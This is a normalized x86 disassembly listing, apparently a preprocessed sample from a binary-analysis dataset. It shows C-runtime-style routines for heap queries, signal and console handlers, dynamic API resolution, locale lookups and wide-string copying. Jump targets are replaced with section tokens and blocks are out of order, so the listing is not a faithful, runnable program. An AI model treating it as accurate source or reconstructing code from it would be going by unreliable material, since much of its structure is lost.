je r-xdata
add esi 0x2
push esi
call sub_409ff1
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
push ebx
call sub_409812
pop ecx
push [ ebp - 0x1c ]
push esi
push eax
call sub_410b69
add esp 0xc
xor ecx ecx
cmp eax ecx
jne r-xdata
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_4077b7
mov eax [ edi + 0x4 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov [ eax + 0x4 ] ebx
jmp r-xdata
sub_410d2a
push 0xc
push r--data
call sub_408380
push 0xe
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410d91
call sub_4083c5
retn
mov eax [ rwxdata ]
mov edx rwxdata
push [ esi + 0x4 ]
call sub_409812
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_409812
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_410d9a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push sub_409812
push sub_409ff1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419a2d
add esp 0x18
pop ebp
retn
mov [ ebp + 0x14 ] 0x2800
sub_410dcd
push 0x10
push r--data
call sub_408380
xor ebx ebx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
push 0xe
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410ed0
push 0x2800
push ebx
add esi 0x9
push esi
push ebx
call sub_410d9a
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
jne r-xdata
push edi
call sub_40c2b0
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rwxdata
call sub_4085a0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x8
call sub_409ff1
pop ecx
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esi + edi ]
cmp [ eax ] 0x20
jne r-xdata
call sub_4083c5
retn
push [ ebp - 0x1c ]
call sub_409812
pop ecx
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x2 ]
push ebx
call sub_409ff1
pop ecx
mov esi eax
test esi esi
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
push edi
call sub_409812
pop ecx
push [ ebp - 0x1c ]
push ebx
push esi
call sub_410b69
add esp 0xc
xor ecx ecx
cmp eax ecx
jne r-xdata
mov eax esi
dec esi
mov [ ebp - 0x20 ] esi
test eax eax
je r-xdata
push ecx
push ecx
push ecx
push ecx
push ecx
call sub_4077b7
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] esi
mov [ edi ] esi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov [ edi + 0x4 ] ecx
mov [ eax + 0x4 ] edi
jmp r-xdata
sub_410ed9
push 0x8
push r--data
call sub_408380
push 0xe
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410f23
call sub_4083c5
retn
mov edi [ esi + 0x4 ]
push [ esi ]
call sub_409812
push esi
call sub_409812
pop ecx
pop ecx
mov esi edi
jmp r-xdata
test esi esi
je r-xdata
sub_410f30
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_410fb8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
pop ebp
retn
sub_41109e
push 0x10
push r--data
call sub_408380
xor edi edi
push edi
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov esi rwxdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x15
mov esi rwxdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41111a
cmp [ ebp - 0x1c ] edi
jne r-xdata
cmp eax 0x1
je r-xdata
cmp eax edi
je r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
call sub_40ad4e
mov [ esi ] eax
xor eax eax
inc eax
push [ ebp - 0x20 ]
call [ ebp - 0x1c ]
pop ecx
call sub_4083c5
retn 0x4
sub_41113a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_411190
push 0x10
push r--data
call sub_408380
and [ ebp - 0x20 ] 0x0
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp esi 0x4
je r-xdata
cmp ebx 0x1
je r-xdata
cmp esi 0x3
je r-xdata
or eax 0xffffffff
cmp ebx 0x3
je r-xdata
push 0x2
pop edi
cmp ebx edi
je r-xdata
cmp ebx 0xd
je r-xdata
push 0x0
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
cmp ebx edi
je r-xdata
cmp ebx 0x15
je r-xdata
cmp ebx 0xf
jle r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
cmp ebx 0x15
jne r-xdata
cmp ebx 0x16
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp ebx 0x11
jle r-xdata
mov eax ebx
sub eax edi
je r-xdata
push 0x1
push sub_41109e
call [ SetConsoleCtrlHandler@IAT ]
xor ecx ecx
inc ecx
cmp eax ecx
jne r-xdata
cmp ebx 0x6
je r-xdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x4
je r-xdata
call sub_4078c1
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov [ ebp - 0x20 ] 0x1
mov esi [ ebp + 0xc ]
mov [ rwxdata ] ecx
jmp r-xdata
cmp ebx 0xf
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411395
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x9
je r-xdata
cmp ebx 0x8
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
jmp r-xdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
sub eax 0x6
je r-xdata
call sub_40aec2
mov esi eax
test esi esi
je r-xdata
cmp ebx 0x4
je r-xdata
call sub_4083c5
retn
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
jmp r-xdata
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] eax
cmp esi edi
je r-xdata
dec eax
jne r-xdata
mov edi r--data
cmp [ esi + 0x5c ] edi
jne r-xdata
cmp ebx 0xb
jne r-xdata
push esi
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
jmp r-xdata
push [ esi + 0x5c ]
mov edx ebx
call sub_41113a
pop ecx
test eax eax
je r-xdata
push [ r--data ]
call sub_40c01b
pop ecx
mov [ esi + 0x5c ] eax
test eax eax
je r-xdata
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
je r-xdata
push [ r--data ]
push edi
push eax
call sub_4090d0
add esp 0xc
add eax 0x4
jmp r-xdata
cmp [ eax ] ebx
je r-xdata
mov [ eax + 0x4 ] ecx
add eax 0xc
mov edx [ r--data ]
imul edx edx 0xc
add edx [ esi + 0x5c ]
lea edi [ eax - 0x4 ]
cmp edi edx
jae r-xdata
jmp r-xdata
sub_4113d0
push 0x20
push r--data
call sub_408380
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
sub eax 0x6
je r-xdata
call sub_40aec2
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_4083c5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_41113a
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40a4bb
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rwxdata
mov eax [ rwxdata ]
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40ecce
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40ad4e
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411537
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_411582
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rwxdata ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_4078ae
mov [ eax ] 0xc
call sub_4078ae
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_40ad4e
push edi
push rwxdata
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_4078ae
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_40786c
pop ecx
mov [ edi ] eax
call sub_407823
call esi
push eax
call sub_40786c
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_411672
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_41a400
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_40c060
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_409812
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_40c060
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_41a271
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_41a400
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4077b7
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_409812
pop ecx
inc esi
push esi
push eax
call sub_40c060
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_409812
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_41a400
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
sub_41182d
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_40ad4e
and [ ebp - 0x14 ] 0x0
cmp [ rwxdata ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rwxdata ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rwxdata ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rwxdata ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rwxdata ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rwxdata ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rwxdata ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rwxdata ] eax
call edi
push eax
call esi
mov [ rwxdata ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rwxdata ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
mov eax [ rwxdata ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_411999
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_407823
mov eax esi
sub_411a0e
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_407823
mov eax esi
jmp r-xdata
sub_411adb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_411af6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_407823
mov eax esi
sub_411b59
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rwxdata ]
pop ebp
retn
sub_411ba7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_411dfc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_406900
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411ba7
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_411e7a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_409812
pop ecx
sub_411e9a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_411eb8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_405894
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_411e7a
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_409ff1
pop ecx
cmp eax ebx
je r-xdata
call sub_41a440
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_411e7a
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_409ff1
pop ecx
cmp eax ebx
je r-xdata
call sub_41a440
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_41209f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_411eb8
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4120e5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
